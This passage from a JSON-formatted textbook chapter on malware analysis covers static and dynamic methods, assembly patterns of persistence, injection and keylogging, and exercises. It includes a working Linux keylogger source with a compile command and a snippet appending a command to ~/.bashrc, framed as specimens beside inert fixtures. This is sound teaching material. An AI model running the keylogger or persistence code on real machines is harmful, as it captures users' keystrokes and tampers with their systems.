        "content": "- Hashing: Compute SHA-256 to identify known malware samples (VirusTotal, hash databases).\n- File identification: file command to determine format (ELF, PE, script, etc.).\n- Strings: Extract printable strings (strings -a) to find URLs, IPs, file paths, messages, API names.\n- Header inspection: Use readelf for ELF, objdump -x for PE to see sections, entry point, imported/exported functions.\n- Checksec: Determine security mitigations (NX, PIE, RELRO, canary)."
      },
      {
        "id": "sec-27-4-2",
        "title": "27.4.2 Import/Export Analysis",
        "content": "- For Windows PE, examine the Import Address Table (IAT) to see which DLL functions are used (e.g., CreateFile, RegSetValue, socket, connect). This gives clues about behavior.\n- For ELF, readelf -d shows dynamic dependencies and objdump -T shows dynamic symbols."
      },
      {
        "id": "sec-27-4-3",
        "title": "27.4.3 Embedded Artifacts",
        "content": "- Extract and analyze embedded executables, DLLs, shellcode, or configuration files.\n- Look for encoded or encrypted blobs; identify the algorithm if possible."
      },
      {
        "id": "sec-27-4-4",
        "title": "27.4.4 Disassembly and Decompilation",
        "content": "- Use objdump, radare2, or Ghidra to disassemble code.\n- Focus on entry point, main, and suspicious API calls.\n- Reconstruct control flow and data structures manually if needed.\n\nStatic analysis can be thwarted by packing/encryption; in such cases, dynamic analysis is necessary to unpack the code."
      },
      {
        "id": "sec-27-5",
        "title": "27.5 Dynamic Malware Analysis Techniques",
        "content": "Dynamic analysis executes the malware in a monitored, isolated environment to observe its behavior. This is where you can see what the malware actually does."
      },
      {
        "id": "sec-27-5-1",
        "title": "27.5.1 Setting Up a Safe Environment",
        "content": "- Use a dedicated virtual machine (VM) with snapshots for quick resets.\n- Disconnect from production networks; use host-only or NAT with monitoring.\n- Install analysis tools: Wireshark, Process Monitor (Windows), strace/ltrace (Linux), tcpdump, fake DNS servers (INetSim), etc.\n- Consider using sandboxes like Cuckoo Sandbox or Joe Sandbox for automated analysis.\n\nClarification: NAT alone does not isolate a sample: it commonly permits outbound access, and host-only networking can expose the host. Use a disposable lab with explicit network containment, snapshots and disabled shared folders/clipboard before analyzing unknown executable behavior."
      },
      {
        "id": "sec-27-5-2",
        "title": "27.5.2 Monitoring Tools",
        "content": "- Process Monitor: Monitors file system, registry, and process activity on Windows.\n- Wireshark/tcpdump: Captures network traffic to identify command-and-control servers.\n- FakeNet/INetSim: Simulates network services to capture malware’s network requests.\n- strace: Traces system calls on Linux.\n- API Monitor: Hooks API calls on Windows to see arguments and return values.\n- Debugger: GDB (Linux) or x64dbg/WinDbg (Windows) for step-by-step analysis."
      },
      {
        "id": "sec-27-5-3",
        "title": "27.5.3 Analyzing Behavior",
        "content": "- File system changes: What files are created, modified, deleted?\n- Registry changes: Persistence mechanisms (e.g., Run keys on Windows).\n- Process creation: Does it inject into other processes?\n- Network activity: DNS queries, HTTP requests, data exfiltration.\n- Memory dumping: After unpacking in memory, dump the process for further static analysis."
      },
      {
        "id": "sec-27-5-4",
        "title": "27.5.4 Debugging Malware",
        "content": "Use a debugger with caution:\n- Set breakpoints on suspicious API calls (e.g., WriteProcessMemory, RegSetValueEx).\n- Bypass anti-debugging by patching or using ScyllaHide.\n- Dump unpacked code from memory and analyze with disassembler."
      },
      {
        "id": "sec-27-6",
        "title": "27.6 Common Malware Behaviors and Their Assembly Patterns",
        "content": "Recognizing common behaviors at the assembly level aids both static and dynamic analysis."
      },
      {
        "id": "sec-27-6-1",
        "title": "27.6.1 Persistence",
        "content": "- Windows registry Run key:",
        "codeSnippets": [
          {
            "language": "text",
            "title": "RegOpenKeyEx, RegSetValueEx with \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"",
            "code": "; RegOpenKeyEx, RegSetValueEx with \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"",
            "explanation": "- Startup folder: Copy executable to %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup.\n- Service creation: CreateService API call.\n- Cron job on Linux: Writing to /etc/cron.d/ or modifying crontab."
          },
          {
            "language": "nasm",
            "title": "Original source: Solution 27.4",
            "code": "#include <stdlib.h>\nint main() {\n    system(\"echo 'malicious_command' >> ~/.bashrc\");\n    return 0;\n}",
            "explanation": "Original source specimen: this edits a real shell startup file. Analyze the command as text; the exercise solution uses a local inert fixture instead."
          }
        ]
      },
      {
        "id": "sec-27-6-2",
        "title": "27.6.2 Network Communication",
        "content": "- Socket creation: socket(AF_INET, SOCK_STREAM, 0) → syscall number 41 on Linux, or WSASocket on Windows.\n- Connect: connect syscall (42) with sockaddr structure containing IP/port.\n- DNS resolution: getaddrinfo or gethostbyname before connect.\n- HTTP requests: Sending strings like \"GET /\" after connect.\n\nClarification: The numbers 41 and 42 are Linux x86-64 syscall numbers. Other architectures use different tables. API names and instruction patterns require surrounding arguments and outcomes to support a behavior claim."
      },
      {
        "id": "sec-27-6-3",
        "title": "27.6.3 Process Injection",
        "content": "- Windows: VirtualAllocEx to allocate memory in target, WriteProcessMemory to write shellcode, CreateRemoteThread to execute.\n- Linux: ptrace to attach and manipulate, or process_vm_writev.\n- Assembly patterns include calls to these APIs with appropriate arguments."
      },
      {
        "id": "sec-27-6-4",
        "title": "27.6.4 Ransomware Encryption",
        "content": "- File enumeration: FindFirstFile/FindNextFile (Windows) or opendir/readdir (Linux).\n- Opening files: CreateFile with write access.\n- Encryption: Crypto APIs (CryptEncrypt) or custom algorithms using AES/RC4; look for aes instructions or cryptographic constants.\n- File rename: Change extension to .locked or .encrypted."
      },
      {
        "id": "sec-27-6-5",
        "title": "27.6.5 Keylogging",
        "content": "- SetWindowsHookEx with WH_KEYBOARD_LL (Windows).\n- Reading from /dev/input/event* on Linux.\n- Polling with GetAsyncKeyState in a loop.\n- Assembly shows repeated calls to these functions."
      },
      {
        "id": "sec-27-6-6",
        "title": "27.6.6 Downloader/Dropper",
        "content": "- Downloads additional payload from URL: URLDownloadToFile or WinHTTP / libcurl on Linux.\n- Writes payload to disk and executes: CreateProcess or system."
      },
      {
        "id": "sec-27-7",
        "title": "27.7 Basic Malware Analysis Workflow",
        "content": "A systematic approach ensures thorough analysis and documentation."
      },
      {
        "id": "sec-27-workflow-1",
        "title": "Step 1: Triage",
        "content": "- Collect sample and compute hashes.\n- Identify file type and architecture.\n- Submit hash to VirusTotal or other threat intelligence platforms."
      },
      {
        "id": "sec-27-workflow-2",
        "title": "Step 2: Static Analysis",
        "content": "- Extract strings and examine headers/imports.\n- Disassemble entry point and suspicious functions.\n- Identify packing or obfuscation; if packed, consider unpacking (static or dynamic)."
      },
      {
        "id": "sec-27-workflow-3",
        "title": "Step 3: Dynamic Analysis",
        "content": "- Set up isolated VM with monitoring.\n- Execute sample and observe behavior (file, registry, network, processes).\n- Capture network traffic and memory dumps.\n- Debug if necessary to bypass anti-analysis."
      },
      {
        "id": "sec-27-workflow-4",
        "title": "Step 4: In-Depth Code Analysis",
        "content": "- Reverse engineer critical functions (persistence, network, encryption).\n- Identify encryption keys, C2 addresses, and configuration.\n- Reconstruct full functionality."
      },
      {
        "id": "sec-27-workflow-5",
        "title": "Step 5: Reporting",
        "content": "- Document findings: capabilities, IOCs, infection vector, recommendations.\n- Share indicators with security team or community (if appropriate)."
      },
      {
        "id": "sec-27-8",
        "title": "27.8 Practical Example: Analyzing a Simulated Keylogger (Linux)",
        "content": "We'll simulate a simple keylogger that writes keystrokes to a file, then analyze it using static and dynamic methods. This is for educational purposes only."
      },
      {
        "id": "sec-27-8-1",
        "title": "27.8.1 The Malicious Code (Simulated)",
        "content": "\n\nClarification: The original code reads real input devices; it is not a synthetic simulation. Keep it as a source-analysis specimen. event0 is not guaranteed to be a keyboard, ev.code is a key code rather than a character, and ignored read/write results can reuse stale data or loop forever. The runnable companion below uses only fixed fictional events and a disposable local output file.",
        "codeSnippets": [
          {
            "language": "c",
            "title": "27.8.1 The Malicious Code (Simulated) — listing 1",
            "code": "#include <stdio.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <linux/input.h>\n\nint main() {\n    int fd = open(\"/dev/input/event0\", O_RDONLY);\n    if (fd < 0) return 1;\n    int logfd = open(\"/tmp/keys.log\", O_WRONLY | O_CREAT | O_APPEND, 0600);\n    struct input_event ev;\n    while (1) {\n        read(fd, &ev, sizeof(ev));\n        if (ev.type == EV_KEY && ev.value == 1) {\n            char c = ev.code;\n            write(logfd, &c, 1);\n        }\n    }\n    return 0;\n}",
            "explanation": "Compile stripped:"
          },
          {
            "language": "bash",
            "title": "27.8.1 The Malicious Code (Simulated) — listing 2",
            "code": "gcc -O2 -s keylog.c -o keylog"
          },
          {
            "language": "c",
            "title": "Runnable synthetic event fixture",
            "code": "// synthetic_events.c: fixed fictional event labels; no input devices or hooks.\n#include <stdio.h>\nint main(void) {\n    static const char *events[]={\"SYNTHETIC_KEY_A\", \"SYNTHETIC_KEY_B\", \"SYNTHETIC_ENTER\"};\n    FILE *out=fopen(\"synthetic-events.log\",\"wx\");\n    if (!out) return 1;\n    for (unsigned i=0;i<sizeof events/sizeof events[0];i++)\n        if (fprintf(out,\"%s\\n\",events[i])<0) { fclose(out); return 1; }\n    return fclose(out)!=0;\n}",
            "explanation": "Compile with gcc -O2 -g synthetic_events.c -o synthetic_events in a disposable exercise directory. The wx mode fails rather than overwriting an existing log. This models observable file I/O, not key capture."
          }
        ]
      },
      {
        "id": "sec-27-8-2",
        "title": "27.8.2 Static Analysis",
        "content": "- file keylog: ELF 64-bit LSB executable, x86-64.\n- strings keylog: finds \"/dev/input/event0\", \"/tmp/keys.log\".\n- readelf -d: shows libc dependency.\n- objdump -d: disassemble main (identify via entry point and __libc_start_main).\n  - Look for calls to open, read, write. The string addresses reveal the filenames.\n\nFrom the disassembly, we see:",
        "codeSnippets": [
          {
            "language": "text",
            "title": "27.8.2 Static Analysis — listing 1",
            "code": "lea rdi, [rip+0x...]  ; \"/dev/input/event0\"\ncall open\n...\nlea rdi, [rip+0x...]  ; \"/tmp/keys.log\"\ncall open\n...\nloop:\ncall read\n...\ncall write",
            "explanation": "This reveals its keylogging behavior."
          }
        ]
      },
      {
        "id": "sec-27-8-3",
        "title": "27.8.3 Dynamic Analysis",
        "content": "- Run under strace:\n\nClarification: The original trace and run instructions are retained as source material, not the runnable exercise. Use the synthetic companion below to observe file writes without collecting keyboard activity. Contemporary libc may show openat instead of open, and descriptor numbers vary.",
        "codeSnippets": [
          {
            "language": "bash",
            "title": "27.8.3 Dynamic Analysis — listing 1",
            "code": "strace ./keylog",
            "explanation": "Output shows:"
          },
          {
            "language": "text",
            "title": "27.8.3 Dynamic Analysis — listing 2",
            "code": "open(\"/dev/input/event0\", O_RDONLY) = 3\nopen(\"/tmp/keys.log\", O_WRONLY|O_CREAT|O_APPEND, 0600) = 4\nread(3, ...) ...\nwrite(4, ...) ...",
            "explanation": "Confirms the keylogging.\n\n- Run in a VM, press keys, and check /tmp/keys.log for captured keystrokes.\n\nThis simple example illustrates the workflow."
          },
          {
            "language": "bash",
            "title": "Trace the synthetic fixture",
            "code": "strace -e trace=openat,write,close ./synthetic_events\ncat synthetic-events.log",
            "explanation": "Expect three fictional event labels. A second run fails because the output already exists. Use a new exercise directory for another run."
          }
        ]
      }
    ],
    "exercises": [
      {
        "id": "ex-27-1",
        "title": "Exercise 27.1: Identify Optimization in a Simple Function",
        "description": "Write a C function that returns the maximum of two integers. Compile with -O0 and -O3. Disassemble both. Identify how the compiler optimized the branch (e.g., using cmov).",
        "solution": "// gcc -O0 -c maximum.c -o max-O0.o\n// gcc -O3 -c maximum.c -o max-O3.o\n// objdump -d -M intel max-O0.o\n// objdump -d -M intel max-O3.o\nint maximum(int a,int b) { return a>b?a:b; }",
        "solutionExplanation": "\nOriginal source guidance: - -O0 version uses cmp and conditional jumps.\n- -O3 version uses cmp and cmovg (or cmovl) to select max without branching. A compiler can use CMOV even at -O0; record actual output rather than requiring a branch at one level. Both must return the same maximum, including equal and negative inputs.",
        "solutionLanguage": "c"
      },
      {
        "id": "ex-27-2",
        "title": "Exercise 27.2: Static Analysis of a Suspicious Binary",
        "description": "Create a simple program that writes \"Hello\" to a file. Strip it. Use strings and objdump to find the filename and the write call. Explain your steps.",
        "solution": "#include <errno.h>\n#include <fcntl.h>\n#include <unistd.h>\nint main(void) {\n    int fd=open(\"out.txt\",O_WRONLY|O_CREAT|O_EXCL,0600);\n    if (fd<0) return 1;\n    const char *p=\"Hello\"; size_t remaining=5;\n    while (remaining) {\n        ssize_t n=write(fd,p,remaining);\n        if (n<0 && errno==EINTR) continue;\n        if (n<=0) { close(fd); return 1; }\n        p+=n; remaining-=(size_t)n;\n    }\n    return close(fd)!=0;\n}",
        "solutionExplanation": "\nOriginal source guidance: - strings reveals the filename.\n- objdump -d shows lea rdi, [rip+offset] and call to open, then write. Save as writer.c in a disposable directory; gcc -O0 -s writer.c -o writer; strings -a writer; objdump -d -M intel writer. The complete program creates a new file with O_EXCL and handles interrupted/short writes. It does not overwrite an existing file.",
        "solutionLanguage": "c"
      },
      {
        "id": "ex-27-3",
        "title": "Exercise 27.3: Dynamic Analysis with strace",
        "description": "Run the file-writing program under strace and observe the open and write system calls. Note the arguments and return values.",
        "solution": "strace -o trace.txt -e trace=open,openat,write,close ./writer\ncat trace.txt\ncat out.txt\n# Use a fresh exercise directory so out.txt does not already exist.",
        "solutionLanguage": "bash",
        "solutionExplanation": "strace output:\nOriginal source guidance: open(\"out.txt\", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 3\nwrite(3, \"Hello\", 5) = 5\nclose(3) = 0 Use Exercise 27.2 writer: the expected flags are O_WRONLY|O_CREAT|O_EXCL with mode 0600, not the original illustrative O_TRUNC/0644 trace. Expect total writes of five bytes and a successful close; record actual return values."
      },
      {
        "id": "ex-27-4",
        "title": "Exercise 27.4: Recognize Persistence Pattern",
        "description": "Write a Windows-like registry persistence simulation in C (for Linux, use system(\"echo ... >> ~/.bashrc\")). Disassemble and identify the command string and the system call.",
        "solution": "// Simulate a persistence-related file artifact without installing persistence.\n#include <stdio.h>\nint main(void) {\n    FILE *f=fopen(\"startup-fixture.txt\",\"wx\");\n    if (!f) return 1;\n    int ok=fputs(\"# INERT TRAINING FIXTURE: startup entry would be recorded here\\n\",f)>=0;\n    if (fclose(f)!=0) ok=0;\n    return !ok;\n}\n// gcc -O0 -g fixture.c -o fixture\n// strings -a fixture; objdump -d -M intel --disassemble=main fixture",
        "solutionLanguage": "c",
        "solutionExplanation": "C code:\n\nDisassembly shows loading the string and calling system.\nOriginal source guidance: #include <stdlib.h>\nint main() {\n    system(\"echo 'malicious_command' >> ~/.bashrc\");\n    return 0;\n} This fixture is not loaded by a shell or startup mechanism. Identify its path, fopen and fputs calls, and compare that evidence with the original specimen’s system string. system is a C library function that invokes a shell, not a Linux syscall named system."
      },
      {
        "id": "ex-27-5",
        "title": "Exercise 27.5: Obfuscation Challenge",
        "description": "Take a simple \"Hello, World!\" program and manually obfuscate the string by XOR-ing it with a key, then decrypt at runtime. Compile, then attempt to recover the original string using static and dynamic analysis.",
        "solution": "#include <stdio.h>\n#include <stddef.h>\nint main(void) {\n    const unsigned char encoded[]={0x4c,0x61,0x68,0x68,0x6b,0x28,0x24,0x53,0x6b,0x76,0x68,0x60,0x25};\n    char msg[sizeof encoded+1];\n    for (size_t i=0;i<sizeof encoded;i++) msg[i]=(char)(encoded[i]^0x04);\n    msg[sizeof encoded]='\\0';\n    puts(msg);\n    return 0;\n}",
        "solutionLanguage": "c",
        "solutionExplanation": "Obfuscated program:\n\nStatic analysis: strings won't show the plaintext. Disassembly reveals the XOR loop. Dynamic analysis: debugger can break after decryption and inspect memory.\nOriginal source guidance: char msg[] = {0x2b,0x3a,0x3c,0x3c,0x3f,0x3,0x37,0x3f,0x3a,0x3c,0x2c,0x24}; // XOR \"Hello, World!\" with 0x4\nfor (int i=0; i<sizeof(msg); i++) msg[i] ^= 0x4;\nputs(msg); The corrected message is Hello, World! and the output is explicitly terminated. Build at -O0 -g and -O2; compare strings and disassembly. Optimization may materialize plaintext, so XOR encoding does not guarantee its absence from a binary. In GDB break at puts and inspect x/s $rdi."
      }
    ],
    "practiceQuestions": [
      {
        "question": "What are some common compiler optimizations that make reverse engineering harder? How do you deal with them?",
        "answer": "Inlining, frame-pointer omission, constant folding, vectorization, unrolling and instruction scheduling obscure source boundaries. Track data flow and ABI behavior, recover basic blocks, compare multiple inputs and treat decompiler types as hypotheses."
      },
      {
        "question": "Explain the difference between code obfuscation and compiler optimization. Give examples of obfuscation techniques.",
        "answer": "Optimization seeks better performance or size while preserving required semantics. Obfuscation intentionally obstructs understanding, for example dispatcher-based control flow, opaque predicates, encoded strings or junk bytes. A complex pattern alone does not establish malicious intent."
      },
      {
        "question": "What is the purpose of static malware analysis? What information can you extract?",
        "answer": "Static analysis identifies format, architecture, hashes, strings, imports, sections, relocations and potential control flow without executing the sample. These are clues to capabilities; imports and strings do not prove that a behavior occurred."
      },
      {
        "question": "Describe how dynamic malware analysis works and what tools are used.",
        "answer": "Dynamic analysis observes execution in a controlled lab with a recorded baseline. Debuggers, strace, Process Monitor and packet capture reveal arguments, results and side effects. Results describe the exercised paths and environment, not every possible behavior."
      },
      {
        "question": "What are indicators of compromise (IOCs)? Provide examples.",
        "answer": "IOCs are artifacts useful for detection or investigation, such as a SHA-256, a domain contacted, a distinctive file path or registry value. Record context, timestamps and confidence; shared infrastructure or common filenames can create false positives."
      },
      {
        "question": "How can you detect if a binary is packed or encrypted?",
        "answer": "High entropy, unusual section layout, a small import set and a decoding stub can suggest packing. Compression, encrypted data and legitimate protectors can look similar. Correlate multiple observations; absence of readable strings is insufficient proof."
      },
      {
        "question": "What are some common persistence mechanisms used by malware on Windows? On Linux?",
        "answer": "Examples include Windows Run keys, startup folders and services; Linux shell startup files, cron jobs and systemd units. Distinguish observed writes from inferred persistence and test simulations only against disposable fixture paths."
      },
      {
        "question": "How does malware typically communicate with a command-and-control server? What network indicators might you look for?",
        "answer": "Communication can use sockets, HTTP(S), DNS or other protocols. Record destinations, ports, DNS answers, timing, certificates and request characteristics; encryption may hide content. Network activity alone does not establish command-and-control."
      },
      {
        "question": "What is process injection? Name two Windows APIs used for this purpose.",
        "answer": "Process injection places or runs code in another process. VirtualAllocEx and WriteProcessMemory are two relevant Windows APIs; CreateRemoteThread can start execution. Legitimate tools also use these APIs, so establish the full sequence and context."
      },
      {
        "question": "What legal and ethical considerations must you keep in mind when analyzing malware?",
        "answer": "Analyze within the authorized scope, keep samples and captured data contained, and respect privacy and confidentiality. External uploads or sharing can disclose sensitive material; document permission, methods, uncertainty and reproducibility."
      }
    ],
    "summary": [
      "Optimized binaries contain transformed code; understanding compiler optimizations is essential for reverse engineering.",
      "Obfuscation and anti-analysis techniques deliberately hinder analysis; dynamic analysis often bypasses them.",
      "Malware analysis combines static and dynamic methods to understand malicious behavior.",
      "Static analysis: hashing, strings, headers, imports, disassembly.",
      "Dynamic analysis: sandbox execution, system call tracing, network monitoring, debugging.",
      "Common malware behaviors: persistence, network communication, process injection, encryption, keylogging.",
      "A systematic workflow (triage, static, dynamic, code analysis, reporting) ensures thoroughness.",
      "Always use isolated environments and adhere to legal/ethical guidelines.",
      "In the next chapter, we begin the advanced project series with a command-line calculator, applying all the skills learned so far."
    ]
  }
];
